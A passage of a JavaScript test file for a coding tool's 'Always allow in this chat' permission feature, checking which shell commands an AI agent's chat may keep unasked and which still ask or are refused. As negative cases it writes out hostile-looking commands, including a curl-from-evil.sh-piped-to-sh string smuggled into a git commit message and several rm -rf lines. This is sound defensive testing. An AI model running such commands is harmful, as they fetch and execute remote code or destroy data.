// @ts-check
// "Always allow in this chat" (d-allow, the owner's of 11-12): a command with no shape a project could learn — a flag
// where its subcommand would be, a path, a pipe — asked every time it ran, with no always-row on its card (a team's lead
// ran three test files: seven Allow presses in one turn). Its card now offers to allow exactly that command for good, in
// that chat alone: what a press keeps (each part that neither only reads nor is a cd that stays put), the offer and what
// never gets one, the press's route, where it lifts — a coding agent's request and the loop's own call, read live at
// each verdict —, Forget, a restart, and the page's row, toast and Remembered rules.
// Through `createAgentPermits`, the reader's own functions, and a real Filament with a fake provider and the fake ACP
// agent (fixtures/fake-acp-agent.mjs `~permbash <command> ~then <command>`).
import { test, describe, before, after } from "node:test";
import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FAKE_ACP_AGENT, anthropicReply, fakeUpstream, parseSse, startApp } from "./helpers/app.js";
import { fakeH, fakeDrawIn, textOf, buttonsOf } from "./helpers/fake-dom.js";
import { removeDirs, until } from "./helpers/wait.js";
import { createAgentPermits } from "../src/app/agent-permits.js";
import { grantFor } from "../src/app/agent/grants.js";
import { readOnlyCommand } from "../src/adapters/tools/read-only-commands.js";
import { SHELL } from "../src/adapters/tools/shell.js";
import { safeEnv } from "../src/adapters/tools/hands.js";
import { permissionShape } from "../src/services/memory/permissions.js";
import { PRESS_HEADER, setPressKey } from "../src/http/guards.js";
import { AGENT_ROUTES, agentRefusal } from "../src/http/admin/remote.js";
import { fromJudged } from "../src/adapters/agents/asks.js";
import { permissionBlock } from "../src/ui/harness/conversation/interaction.js";
import { createDecisions } from "../src/ui/harness/conversation/decisions.js";
import { createModeSwitch } from "../src/ui/harness/composer/mode.js";
import * as labels from "../src/ui/harness/lib/labels.js";

/** The reader of what a chat keeps (new with d-allow): loaded where a test needs it, so the others say their own failure. */
const chatAlways = () => import("../src/app/agent/chat-always.js");

/** The trial's command: a flag where a subcommand would be, so no project's always-allow has a shape for it. */
const A = "node --test test/a.test.js";
/** Whether two spellings name one folder. @param {string} a @param {string} b */
const sameFolder = (a, b) => {
  const key = (/** @type {string} */ p) => (process.platform === "win32" ? realpathSync(p).toLowerCase() : realpathSync(p));
  return key(a) === key(b);
};
/** The card's rows. @param {any} el */
const rows = (el) => buttonsOf(el).filter((b) => String(b.attrs.class || "").split(/\s+/).includes("ix-option"));
/** Every `code` under a node. @param {any} n @param {any[]} [out] @returns {any[]} */
const codes = (n, out = []) => {
  for (const k of n?.kids || []) if (k && typeof k === "object") { if (k.tag === "code") out.push(k); codes(k, out); }
  return out;
};

/** @type {string[]} */
const made = [];
after(() => {
  for (const d of made) rmSync(d, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});
/** A project's folder, with a folder in it. */
const project = () => {
  const root = mkdtempSync(join(tmpdir(), "filament-chat-always-unit-"));
  made.push(root);
  mkdirSync(join(root, "sub"));
  return root;
};

describe("what a press keeps, and what a kept command covers (d-allow §2, §4)", () => {
  const root = project();
  const place = { at: { root, shell: SHELL.kind }, readsOnly: (/** @type {string} */ part) => readOnlyCommand(part, { root, shell: SHELL, env: safeEnv() }) };

  // (fails before: yes — a grant covered its command "or followed by more words"; there was no exact entry)
  test("a grant's reading takes exact entries: the command as written, never with more words after it", () => {
    const exact = { check: [], mayRun: [], exact: ["node build.js"] };
    const g = (/** @type {string} */ c) => grantFor(/** @type {any} */ (exact), c, "bash", { ...place, outside: () => false });
    assert.deepEqual(g("node build.js"), ["node build.js"]);
    assert.deepEqual(g("NODE build.js 2>&1 | tail -20"), ["node build.js"], "without case, its harmless redirect read past, a part that only reads beside it");
    assert.equal(g("node build.js ../x"), null, "more words after it: another command");
    assert.equal(g("node build.js && node other.js"), null);
    assert.deepEqual(grantFor({ check: [], mayRun: ["node build.js"] }, "node build.js ../x", "bash", { ...place, outside: () => false }), ["node build.js"], "a brief's may_run still covers more words");
  });

  // (fails before: yes — no such module: nothing read a command for what a chat could keep of it)
  test("a press keeps each part that neither only reads nor is a cd that stays put; a command that says more than its words is never kept", async () => {
    const { keepsOf } = await chatAlways();
    /** @param {string} c @param {string} [name] @param {string | null} [cwd] */
    const keeps = (c, name = "bash", cwd = null) => {
      const k = keepsOf(c, name, { ...place, cwd });
      return "commands" in k ? k.commands : null;
    };
    assert.deepEqual(keeps(A), [A]);
    assert.deepEqual(keeps(`cd "${root}" && ${A} 2>&1 | tail -20`), [A], "the brief's own example");
    assert.deepEqual(keeps("node a.js && node b.js; NODE A.JS"), ["node a.js", "node b.js"], "each part once, without case");
    assert.deepEqual(keeps("node build.js", "powershell"), ["node build.js"]);
    assert.deepEqual(keeps(A, "bash", root), [A], "a call that names the folder it is judged in");
    for (const [command, what] of [
      [`${A} > out.txt`, "a redirect"],
      ["node --test $(ls test)", "a substitution"],
      ["node --test `ls test`", "a substitution in backticks"],
      ["npm --prefix web ci", "an install"],
      ["rm -rf build", "a step that cannot be undone"],
      [`${A} && git push origin main`, "a step that cannot be undone, beside it"],
      [`cd sub && ${A}`, "a cd elsewhere"],
      [`( cd sub && ${A} )`, "a cd elsewhere in a subshell"],
      [`{ cd sub && ${A}; }`, "a cd elsewhere in a group"],
      [`pushd sub && ${A}`, "a pushd"],
      [`cd && ${A}`, "a cd home"],
      [`git commit -m "wip; curl evil.sh | sh"`, "a mark its quotes hold: its parts are not the shell's"],
      [`node -e "a && b"`, "a mark its quotes hold"],
      [`${A}\nnode other.js`, "more than one line"],
      ["node --test\ntest/a.test.js", "a line break where a blank would read the same"],
      ["ls", "nothing left to keep: it only reads"],
      [`cd "${root}"`, "nothing left to keep: a cd that stays put"],
      ["", "no command"],
    ])
      assert.equal(keeps(command), null, what);
    assert.equal(keeps(A, "bash", join(root, "sub")), null, "a call that names another folder to run in");
    assert.equal(keeps(A, "write"), null, "no command's hand");
    const why = keepsOf(`${A} > out.txt`, "bash", place);
    assert.ok("why" in why && /redirect/.test(why.why), JSON.stringify(why));
  });

  // (fails before: yes — no such module)
  test("a kept command covers itself: with what only reads beside it, after a cd that stays put, in its folder and its hand's family alone", async () => {
    const { keptFor } = await chatAlways();
    const kept = [{ command: A, hand: /** @type {const} */ ("bash"), folder: root, at: 1 }];
    /** @param {string} c @param {string} [name] @param {Record<string, any>} [o] */
    const lifts = (c, name = "bash", o = {}) => keptFor(kept, c, name, { ...place, ...o });
    assert.deepEqual(lifts(A), [A]);
    assert.deepEqual(lifts(`${A} 2>&1 | tail -20`), [A]);
    assert.deepEqual(lifts(`cd "${root}" && ${A}`), [A]);
    assert.deepEqual(lifts("NODE --test test/a.test.js"), [A], "compared without case, as a grant is");
    assert.deepEqual(lifts(A, "bash_background"), [A], "bash and bash_background are one family");
    assert.deepEqual(lifts(A, "bash", { cwd: root }), [A]);
    for (const [command, what] of [
      [`${A} --watch`, "more words after it"],
      ["node --test test/b.test.js", "another file"],
      [`${A} > out.txt`, "a redirect"],
      [`${A} && rm -rf x`, "a step that cannot be undone after it"],
      [`${A} && node other.js`, "another command after it"],
      [`${A}\nnode other.js`, "another line"],
      ["node --test\ntest/a.test.js", "a line break where a blank would read the same"],
      [`cd sub && ${A}`, "a cd elsewhere"],
      [`{ cd sub; ${A}; }`, "a cd elsewhere in a group"],
      [`echo "x && ${A} && y"`, "the command in another's quotes"],
      ["ls", "nothing kept in it"],
    ])
      assert.equal(lifts(command), null, what);
    assert.equal(lifts(A, "powershell"), null, "the other hand's family");
    assert.equal(lifts(A, "bash", { at: { root: join(root, "sub"), shell: SHELL.kind } }), null, "another folder");
    assert.equal(lifts(A, "bash", { cwd: join(root, "sub") }), null, "a call that names another folder to run in");
    assert.equal(keptFor([], A, "bash", place), null, "a chat that kept nothing");
  });

  // (fails before: yes — no such module)
  test("the list a chat keeps: read whole or not at all, a command once for its hand and folder, capped, and Forget takes one out", async () => {
    const { ALWAYS_MAX, ALWAYS_CHARS, keptOf, withKept, withoutKept } = await chatAlways();
    assert.deepEqual([ALWAYS_MAX, ALWAYS_CHARS], [100, 2000]);
    const one = { command: A, hand: /** @type {const} */ ("bash"), folder: root, at: 5 };
    assert.deepEqual(keptOf([one, { command: A }, null, "x", { ...one, hand: "write" }, { ...one, command: "" }, { ...one, command: "x".repeat(2001) }]), [one], "an entry that is not whole keeps nothing");
    assert.deepEqual(keptOf(undefined), []);
    const more = withKept([one], { hand: "bash", folder: root, commands: [A.toUpperCase(), "node build.js"] }, 9);
    assert.deepEqual(more, [one, { command: "node build.js", hand: "bash", folder: root, at: 9 }], "a command kept already is not kept twice");
    assert.deepEqual(withKept([one], { hand: "powershell", folder: root, commands: [A] }, 9)?.length, 2, "the other hand's is its own");
    const full = Array.from({ length: ALWAYS_MAX }, (_, i) => ({ command: `node step${i}.js`, hand: /** @type {const} */ ("bash"), folder: root, at: i }));
    assert.equal(withKept(full, { hand: "bash", folder: root, commands: [A] }, 9), null, "past the cap nothing is kept, and no older one dropped");
    assert.deepEqual(withKept(full, { hand: "bash", folder: root, commands: ["node step3.js"] }, 9), full, "one kept already is no more");
    assert.deepEqual(withoutKept(/** @type {any} */ (more), { command: A, hand: "bash", folder: root }), [more?.[1]]);
  });
});

describe("the chat's offer on a coding agent's request (d-allow §3)", () => {
  const root = project();
  /** The chat's kept commands, as its meta holds them. @type {any[]} */
  let kept = [];
  /** The project's learned permissions, standing in: a shape is offered where the command has one. */
  const learned = {
    allowed: () => false,
    recordAllow: () => null,
    offered: (/** @type {string} */ name, /** @type {any} */ input) => {
      const s = permissionShape(name, input);
      return s ? { itemId: null, tool: s.tool, shape: s.shape } : null;
    },
  };
  /** The chat's own seat's switch. @param {Record<string, any>} [o] */
  const permits = (o = {}) => createAgentPermits(/** @type {any} */ ({ rules: [], modeNow: () => "edit", learned: null, alwaysRun: () => kept, ...o }));
  /** @param {string} command @param {Record<string, any>} [more] */
  const bash = (command, more = {}) => [{ name: "bash", input: { command, ...more } }];
  /** @param {any} j */
  const offered = (j) => [j.verdict, /** @type {any} */ (j).keeps ?? null];

  // (fails before: yes — the ask carried the project's offer or none: `keeps` was undefined)
  test("a command with no shape carries the chat's offer and no project one; one with a shape the project's alone", () => {
    kept = [];
    const j = /** @type {any} */ (permits({ learned }).judge(bash(A), root));
    assert.deepEqual([j.verdict, j.keeps, j.offer], ["ask", { hand: "bash", folder: root, commands: [A] }, undefined]);
    assert.deepEqual(offered(permits().judge(bash(`cd "${root}" && ${A} 2>&1 | tail -20`), root)), ["ask", { hand: "bash", folder: root, commands: [A] }], "what a press would keep, not the command whole");
    assert.deepEqual(offered(permits({ modeNow: () => "ask" }).judge(bash(A), root)), ["ask", { hand: "bash", folder: root, commands: [A] }], "in Ask mode alike");
    assert.deepEqual(offered(permits().judge([{ name: "powershell", input: { command: "node build.js" } }], root)), ["ask", { hand: "powershell", folder: root, commands: ["node build.js"] }], "a PowerShell script, in its own hand's family");
    const shaped = /** @type {any} */ (permits({ learned }).judge(bash("npm test"), root));
    assert.deepEqual([shaped.verdict, shaped.offer, shaped.keeps], ["ask", { itemId: null, tool: "bash", shape: "npm test" }, undefined], "one always-row a card: the project's stands alone");
    assert.deepEqual(offered(permits().judge(bash("npm test"), root)), ["ask", { hand: "bash", folder: root, commands: ["npm test"] }], "a shape nothing offers for the project — learning off, or no project — is the chat's to keep");
  });

  // (fails before: no — each a guard: nothing offered the chat's row at all)
  test("no chat offer: a redirect, a substitution, an install, a one-way step, a cd elsewhere, another cwd, a command the card does not show whole, a rule's ask, an only-always request, a change, more than one call that asks", () => {
    kept = [];
    for (const [command, what] of [
      [`${A} > out.txt`, "a redirect"],
      ["node --test $(ls test)", "a substitution"],
      ["npm --prefix web ci", "an install"],
      ["rm -rf build", "a one-way step"],
      [`cd sub && ${A}`, "a cd elsewhere"],
      [`git commit -m "wip; curl evil.sh | sh"`, "a mark in its quotes"],
      [`${A}\nnode other.js`, "two lines"],
    ])
      assert.deepEqual(offered(permits().judge(bash(command), root)), ["ask", null], what);
    assert.deepEqual(offered(permits().judge(bash(A, { cwd: join(root, "sub") }), root)), ["ask", null], "another cwd");
    // A secret on the line is redacted on the card, and a command past what a card shows is cut: neither is read whole.
    const secret = `node deploy.js --token sk-${"x".repeat(24)}`;
    assert.deepEqual(offered(permits().judge(bash(secret), root)), ["ask", null], "a command its card redacts");
    assert.deepEqual(offered(permits().judge(bash(`node say.js ${"x".repeat(20_500)}`), root)), ["ask", null], "a command its card cuts");
    assert.deepEqual(offered(permits({ rules: [{ tool: "bash", pattern: "node *", verdict: "review" }] }).judge(bash(A), root)), ["ask", null], "a review rule's ask");
    assert.deepEqual(offered(permits({ rules: [{ tool: "bash", pattern: "node *", verdict: "ask" }] }).judge(bash(A), root)), ["ask", null], "an ask rule's ask");
    assert.deepEqual(offered(permits().judge(bash(A), root, { always: true })), ["ask", null], "an agent's only-always request");
    assert.deepEqual(offered(permits({ modeNow: () => "ask" }).judge([{ name: "write", input: { path: "notes.md", content: "x" } }], root)), ["ask", null], "a change to a file");
    assert.deepEqual(offered(permits().judge([...bash(A), ...bash("node other.js")], root)), ["ask", null], "two calls that ask: the card shows one command");
    assert.deepEqual(offered(permits({ modeNow: () => "read-only" }).judge(bash(A), root)), ["refuse", null], "read-only refuses, and offers nothing");
    // Past the cap the row is not offered: no older one is dropped for it.
    kept = Array.from({ length: 100 }, (_, i) => ({ command: `node step${i}.js`, hand: "bash", folder: root, at: i }));
    assert.deepEqual(offered(permits().judge(bash(A), root)), ["ask", null], "a chat that keeps a hundred already");
    kept = [];
  });

  // (fails before: no — guards: these seats were given nothing to keep in)
  test("no chat offer for a seat that is not the chat's own: a worker held to its worktree, another machine's agents' chat, a switch given no chat", () => {
    kept = [];
    const worktree = join(root, ".git", "filament-worktrees", "sa_1");
    mkdirSync(worktree, { recursive: true });
    assert.deepEqual(offered(permits({ confine: worktree, folder: root }).judge(bash(A), worktree)), ["ask", null], "a worker in its worktree");
    assert.deepEqual(offered(permits({ agentsDevice: true }).judge(bash(A), root)), ["ask", null], "another machine's agents' chat");
    assert.deepEqual(offered(permits({ alwaysRun: null }).judge(bash(A), root)), ["ask", null], "a sub-agent's switch is handed no chat");
    // Nor does what the chat kept run for them.
    kept = [{ command: A, hand: "bash", folder: worktree, at: 1 }, { command: A, hand: "bash", folder: root, at: 1 }];
    assert.equal(permits({ confine: worktree, folder: root }).judge(bash(A), worktree).verdict, "ask");
    assert.equal(permits({ agentsDevice: true }).judge(bash(A), root).verdict, "ask");
    kept = [];
  });

  // (fails before: yes — nothing lifted the ask: each asked again)
  test("kept, the command runs unasked at the next verdict — read live — and says so on the record; anything else of it asks; read-only still refuses, Full access asks nothing", () => {
    kept = [];
    const p = permits();
    assert.equal(p.judge(bash(A), root).verdict, "ask");
    kept = [{ command: A, hand: "bash", folder: root, at: 1 }];
    const how = `ran on this chat's always-allow \`${A}\``;
    assert.deepEqual(p.judge(bash(A), root), { verdict: "run", mode: "edit", notes: [], how }, "the same switch, at its next request");
    for (const command of [`${A} 2>&1 | tail -20`, `cd "${root}" && ${A}`]) assert.deepEqual(p.judge(bash(command), root), { verdict: "run", mode: "edit", notes: [], how }, command);
    assert.equal(permits({ modeNow: () => "ask" }).judge(bash(A), root).how, how, "in Ask mode alike");
    for (const [command, what] of [["node --test test/b.test.js", "another file"], [`${A} > out.txt`, "a redirect"], [`${A} && rm -rf x`, "a one-way step after it"]])
      assert.equal(p.judge(bash(command), root).verdict, "ask", what);
    assert.equal(p.judge(bash(A), join(root, "sub")).verdict, "ask", "another folder");
    assert.equal(p.judge(bash(A, { cwd: join(root, "sub") }), root).verdict, "ask", "another cwd");
    assert.equal(p.judge([{ name: "powershell", input: { command: A } }], root).verdict, "ask", "the other hand's family");
    // A rule still speaks first, and a refusal is never lifted.
    assert.equal(permits({ rules: [{ tool: "bash", pattern: "node *", verdict: "ask" }] }).judge(bash(A), root).verdict, "ask", "an ask rule speaks for it");
    assert.equal(permits({ rules: [{ tool: "bash", pattern: "node *", verdict: "review" }] }).judge(bash(A), root).verdict, "ask");
    assert.equal(permits({ rules: [{ tool: "bash", pattern: "node *", verdict: "deny" }] }).judge(bash(A), root).verdict, "refuse");
    assert.deepEqual([permits({ modeNow: () => "read-only" }).judge(bash(A), root).verdict, permits({ modeNow: () => "read-only" }).judge(bash(A), root).how], ["refuse", "refused (read-only mode)"]);
    assert.equal(permits({ modeNow: () => "auto" }).judge(bash(A), root).how, "ran (auto mode)", "Full access asks nothing: nothing to lift");
    assert.equal(p.judge(bash(A), root, { always: true }).verdict, "ask", "an agent's only-always still asks: its always stays with the agent");
    // Forget, between two requests of one turn: it asks again.
    kept = [];
    assert.equal(p.judge(bash(A), root).verdict, "ask");
  });
});

// ---- through a Filament ---------------------------------------------------------------------------------------------

const text = (/** @type {any[]} */ blocks) => (blocks || []).filter((b) => b?.type === "text").map((b) => b.text).join("");
/** A message's words. @param {any} m */
const wordsOf = (m) => (typeof m?.content === "string" ? m.content : (m?.content || []).filter((/** @type {any} */ b) => b?.type === "text").map((/** @type {any} */ b) => b.text).join(""));
/** The words that have the model run commands through bash, in order. @param {string[]} commands */
const run = (commands) => `RUN:${Buffer.from(JSON.stringify(commands)).toString("base64url")}`;
let calls = 0;
/**
 * The model behind the loop's chats: after the newest message that names commands (`run`), it asks to run each through
 * bash in turn, and then says how each went — `ran`, or `refused` where its result was an error.
 * @param {any} call
 */
const brain = async (call) => {
  if (call.kind !== "anthropic") return undefined;
  const reply = (/** @type {any[]} */ blocks, stop = "end_turn") => anthropicReply("", { model: "brain-model", stop, blocks, usage: { input_tokens: 30, output_tokens: 7 } });
  const msgs = call.body.messages || [];
  const at = msgs.findLastIndex((/** @type {any} */ m) => m.role === "user" && /RUN:[\w-]+/.test(wordsOf(m)));
  if (at < 0 || !call.body.tools?.length) return reply([{ type: "text", text: "MODEL ANSWER" }]);
  // The message's last one: the person's own words end it, and what Filament says of a sub-agent's task comes before.
  const commands = JSON.parse(Buffer.from(String([...wordsOf(msgs[at]).matchAll(/RUN:([\w-]+)/g)].at(-1)?.[1]), "base64url").toString("utf8"));
  const done = msgs.slice(at).flatMap((/** @type {any} */ m) => (Array.isArray(m.content) ? m.content.filter((/** @type {any} */ c) => c?.type === "tool_result") : []));
  if (done.length < commands.length) return reply([{ type: "tool_use", id: `c${++calls}`, name: "bash", input: { command: commands[done.length] } }], "tool_use");
  return reply([{ type: "text", text: `DONE: ${done.map((/** @type {any} */ r) => (r.is_error ? "refused" : "ran")).join(" ")}` }]);
};

describe("Always allow in this chat, through a Filament", () => {
  /** @type {Awaited<ReturnType<typeof fakeUpstream>>} */
  let up;
  /** @type {Awaited<ReturnType<typeof startApp>>} */
  let shim;
  const root = mkdtempSync(join(tmpdir(), "filament-chat-always-"));
  const coderDir = join(root, "coder");
  const loopDir = join(root, "loop");
  const elseDir = join(root, "elsewhere");
  /** A command the loop's bash really runs: it adds its letter to ran.txt. No shape: its program is on the line. @param {string} letter */
  const adds = (letter) => `node -e "require('fs').appendFileSync('ran.txt','${letter}')"`;
  const ran = () => (existsSync(join(loopDir, "ran.txt")) ? readFileSync(join(loopDir, "ran.txt"), "utf8") : "");
  /** @param {{ dataDir?: string }} [o] */
  const start = ({ dataDir } = {}) =>
    startApp({
      memory: true,
      keep: true,
      ...(dataDir ? { dataDir } : {}),
      configure: (cfg) => {
        cfg.upstreams = [
          { id: "m", name: "m", type: "anthropic", baseUrl: up.url, apiKey: "s", enabled: true, models: ["brain-model"] },
          { id: "coder", name: "coder", type: "acp", acp: { command: process.execPath, args: [FAKE_ACP_AGENT], env: {}, cwdDefault: coderDir, permissions: "allow-all", hints: false } },
        ];
        cfg.routes = [
          { match: "brain-*", upstream: "m", upstreamModel: "{model}", enabled: true },
          { match: "coder/*", upstream: "coder", upstreamModel: "{1}", enabled: true },
        ];
        cfg.memory.autopilot = { enabled: false };
        cfg.memory.capture = { turns: true, learn: false };
        cfg.agentLoop = { ...cfg.agentLoop, enabled: true, permissions: "edit", roots: [root], readerModel: "" };
      },
    });
  before(async () => {
    for (const d of [coderDir, loopDir, elseDir]) mkdirSync(d);
    up = await fakeUpstream(brain);
    shim = await start();
  });
  after(async () => {
    setPressKey("");
    await shim.stop();
    await up.close();
    await removeDirs(shim.dataDir, root);
  });

  const S = (/** @type {string} */ id) => `/api/sessions/${encodeURIComponent(id)}`;
  /** A chat, its switch at `mode`. @param {string} model @param {string} cwd @param {string} [mode] */
  const chat = async (model, cwd, mode = "edit") => {
    const r = await shim.api("/api/sessions", { method: "POST", body: { cwd, model, preset: "plain", settings: { loop: { permissions: mode } } } });
    assert.equal(r.status, 200, await r.clone().text());
    return String((await r.json()).id);
  };
  /** @param {string} id @param {any} change */
  const settle = async (id, change) => {
    const r = await shim.api(`${S(id)}/settings`, { method: "PATCH", body: change });
    assert.equal(r.status, 200, await r.clone().text());
  };
  /** @param {string} id */
  const settingsOf = async (id) => (await shim.api(`${S(id)}/settings`)).json();
  /** The chat's own rows of the rules in force. @param {string} id */
  const chatRules = async (id) => (await settingsOf(id)).rulesInForce.filter((/** @type {any} */ r) => r.from === "chat");
  /** @param {string} id @param {any} body */
  const always = (id, body) => shim.api(`${S(id)}/rules/always`, { method: "POST", body });
  /** @param {string} id @param {any} rule */
  const forget = (id, rule) => shim.api(`${S(id)}/rules/forget`, { method: "POST", body: rule });
  /** What the chat's meta keeps. @param {string} id @returns {any[]} */
  const keptIn = (id) => /** @type {any} */ (shim.app.memory.archive).getChain(id)?.meta?.alwaysRun || [];
  /** @param {string} runId @returns {Promise<any[]>} */
  const runEvents = async (runId) => (await (await shim.api(`/api/runs/${encodeURIComponent(runId)}/events?since=0&limit=5000`)).json()).events;
  /** What the turn's record says. @param {string} runId @returns {Promise<string[]>} */
  const changes = async (runId) => (await shim.record(runId))?.changes || [];

  // ---- a coding agent's seat ----
  /** A harness turn of a coding agent's chat, and its run's id. @param {string} id @param {string} content */
  const turn = async (id, content) => {
    const res = await shim.api(`${S(id)}/turns`, { method: "POST", body: { content, stream: true, runEvents: true } });
    assert.equal(res.status, 200);
    return { res, runId: String(res.headers.get("x-filament-request-id")) };
  };
  /** The run's question, once it waits. @param {string} runId @param {string} [id] */
  const asked = (runId, id = "q1") => until(async () => (await runEvents(runId)).find((e) => e.type === "ask" && e.id === id) || null, `question ${id}`);
  /** The page's Allow or Deny. @param {string} runId @param {"allow" | "deny"} chosen @param {string} [ask] */
  const permit = async (runId, chosen, ask = "q1") => {
    const r = await shim.api(`/api/runs/${encodeURIComponent(runId)}/answer`, { method: "POST", body: { ask, outcome: "answered", answers: { permission: { chosen: [chosen] } } } });
    assert.equal(r.status, 200, await r.clone().text());
  };
  /** The reply's words, its run's events apart. @param {Response} res */
  const said = async (res) => {
    let out = "";
    for (const { event, data } of parseSse(await res.text())) if (event !== "filament_run" && data?.type === "content_block_delta") out += data.delta?.text ?? "";
    return out;
  };
  /** What the record says of the turn's requests, once written. @param {string} runId @returns {Promise<string[]>} */
  const judged = async (runId) => {
    const rec = await until(async () => {
      const x = await shim.record(runId);
      return x?.acp?.run ? x : null;
    }, "the record");
    return (rec.changes || []).filter((/** @type {string} */ c) => c.startsWith("permission: "));
  };

  /** The coding agent's chat that keeps `A`, and the offer its first ask carried. */
  let coderChat = "";
  /** @type {any} */
  let coderKeeps = null;

  // (fails before: yes — the ask carried no chat offer; the route took a project's shape alone; the second request asked)
  test("a coding agent's seat: the ask carries the chat's offer; pressed through the route it is kept in the chat's meta, and the same command runs unasked in the same turn", async () => {
    coderChat = await chat("coder/fake-a", coderDir);
    const t = await turn(coderChat, `~permbash ${A} ~then ${A} 2>&1 | tail -20`);
    const ask = await asked(t.runId);
    coderKeeps = ask.form.judged.keeps;
    assert.deepEqual([coderKeeps?.hand, coderKeeps?.commands, ask.form.judged.offer], ["bash", [A], null], "the chat's offer, and no project one");
    assert.ok(sameFolder(coderKeeps.folder, coderDir), coderKeeps.folder);
    // The press first, as the project's always goes: then a plain Allow.
    const pressed = await always(coderChat, { keeps: coderKeeps });
    assert.equal(pressed.status, 200, await pressed.clone().text());
    const answer = await pressed.json();
    assert.deepEqual([answer.ok, answer.kept], [true, [A]], "answered with what the toast says");
    assert.deepEqual(answer.rulesInForce[0], { tool: "bash", pattern: A, verdict: "allow", from: "chat" }, "the chat's own first among the rules in force");
    const meta = keptIn(coderChat);
    assert.deepEqual(meta.map((/** @type {any} */ k) => [k.command, k.hand, typeof k.at]), [[A, "bash", "number"]]);
    assert.ok(sameFolder(meta[0].folder, coderDir));
    await permit(t.runId, "allow");
    assert.match(await said(t.res), /permbash: allow-once then allow-once/);
    assert.equal((await runEvents(t.runId)).filter((e) => e.type === "ask").length, 1, "the second ran unasked, in the same turn");
    assert.deepEqual(await judged(t.runId), [
      `permission: coder asked to run \`${A}\` — asked (edit mode)`,
      `permission: coder's request to run \`${A}\` — ran: the person allowed it`,
      `permission: coder asked to run \`${A} 2>&1 | tail -20\` — ran on this chat's always-allow \`${A}\``,
    ]);
    // Pressed again: the one entry, never a second.
    assert.equal((await always(coderChat, { keeps: coderKeeps })).status, 200);
    assert.equal(keptIn(coderChat).length, 1);
  });

  // (fails before: yes — every one of them asked)
  test("a coding agent's seat, a later turn: it runs after a cd into its folder; another file, a redirect, a one-way step after it and a shaped command ask — the last with the project's row alone", async () => {
    const later = await turn(coderChat, `~permbash cd "${coderKeeps.folder}" && ${A}`);
    assert.match(await said(later.res), /permbash: allow-once/);
    assert.equal((await runEvents(later.runId)).some((e) => e.type === "ask"), false, "nobody was asked");
    assert.ok((await judged(later.runId)).at(-1)?.endsWith(`— ran on this chat's always-allow \`${A}\``), JSON.stringify(await judged(later.runId)));
    for (const [command, keeps, what] of /** @type {[string, string[] | null, string][]} */ ([
      ["node --test test/b.test.js", ["node --test test/b.test.js"], "another file: its own offer"],
      [`${A} > out.txt`, null, "a redirect"],
      [`${A} && rm -rf x`, null, "a one-way step after it"],
    ])) {
      const x = await turn(coderChat, `~permbash ${command}`);
      const q = await asked(x.runId);
      assert.deepEqual(q.form.judged.keeps?.commands ?? null, keeps, what);
      await permit(x.runId, "deny");
      assert.match(await said(x.res), /permbash: reject/, what);
    }
    const shaped = await turn(coderChat, "~permbash npm test");
    const q = await asked(shaped.runId);
    assert.deepEqual([q.form.judged.offer?.shape, q.form.judged.keeps], ["npm test", undefined], "a shape: the project's row, and not the chat's");
    await permit(shaped.runId, "deny");
    await said(shaped.res);
  });

  // (fails before: yes — the route answered 400 to every body that was no project's shape, these and a good one alike)
  test("the route trusts no body: a command that cannot be kept, a folder that is not the chat's, a hand that runs no command and a full list are refused in words; it is closed where the project's always is", async () => {
    /** @param {any} keeps @param {number} status @param {RegExp} words */
    const refused = async (keeps, status, words) => {
      const r = await always(coderChat, { keeps });
      assert.equal(r.status, status, `${JSON.stringify(keeps)}: ${await r.clone().text()}`);
      assert.match(String((await r.json()).error), words);
    };
    await refused({ ...coderKeeps, commands: [`${A} > out.txt`] }, 400, /redirects or substitutes/);
    await refused({ ...coderKeeps, commands: ["npm --prefix web ci"] }, 400, /installs packages/);
    await refused({ ...coderKeeps, commands: ["rm -rf build"] }, 400, /cannot be undone/);
    await refused({ ...coderKeeps, commands: [`${A} && node other.js`] }, 400, /more than one command/);
    await refused({ ...coderKeeps, commands: ["cd sub"] }, 400, /another folder/);
    await refused({ ...coderKeeps, commands: [`cd "${coderKeeps.folder}"`] }, 400, /cannot be always allowed in this chat: nothing in it is left to keep/);
    await refused({ ...coderKeeps, commands: [`node say.js ${"x".repeat(2000)}`] }, 400, /2,000 characters/);
    await refused({ ...coderKeeps, commands: [] }, 400, /keeps is/);
    await refused({ ...coderKeeps, hand: "write" }, 400, /keeps is/);
    await refused({ ...coderKeeps, folder: elseDir }, 400, /not this chat's folder/);
    await refused("node build.js", 400, /keeps is/);
    assert.deepEqual(keptIn(coderChat).map((/** @type {any} */ k) => k.command), [A], "nothing of them was kept");
    // A full list keeps no more, and drops none.
    const archive = /** @type {any} */ (shim.app.memory.archive);
    const was = keptIn(coderChat);
    archive.mergeMeta(coderChat, { alwaysRun: Array.from({ length: 100 }, (_, i) => ({ command: `node step${i}.js`, hand: "bash", folder: coderKeeps.folder, at: i })) });
    await refused({ ...coderKeeps, commands: ["node build.js"] }, 409, /keeps 100 commands already/);
    assert.equal(keptIn(coderChat).length, 100);
    archive.mergeMeta(coderChat, { alwaysRun: was });
    // A chat another machine's agents started keeps nothing for them.
    archive.mergeMeta(coderChat, { agentDevice: "dev_far" });
    await refused(coderKeeps, 409, /another machine's agents/);
    archive.mergeMeta(coderChat, { agentDevice: undefined });
    // Their device may not call the row at all, and this computer's press needs the app's key while it holds one.
    assert.equal(AGENT_ROUTES.includes("POST /sessions/:id/rules/always"), false);
    assert.match(String(agentRefusal("POST", `${S(coderChat)}/rules/always`, "/sessions/:id/rules/always", { name: "Laptop's agents", grants: { agents: true } })), /is more than that/);
    const KEY = randomBytes(32).toString("base64url");
    const plain = (/** @type {Record<string, string>} */ headers) => fetch(`${shim.url}${S(coderChat)}/rules/always`, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify({ keeps: { ...coderKeeps, commands: ["node build.js"] } }) });
    setPressKey(KEY);
    try {
      const keyless = await plain({});
      assert.equal(keyless.status, 403, await keyless.clone().text());
      assert.equal((await keyless.json()).press, true);
      assert.deepEqual(keptIn(coderChat).map((/** @type {any} */ k) => k.command), [A], "refused before anything is kept");
      const keyed = await plain({ [PRESS_HEADER]: KEY });
      assert.equal(keyed.status, 200, await keyed.clone().text());
      assert.deepEqual((await keyed.json()).kept, ["node build.js"]);
    } finally {
      setPressKey("");
    }
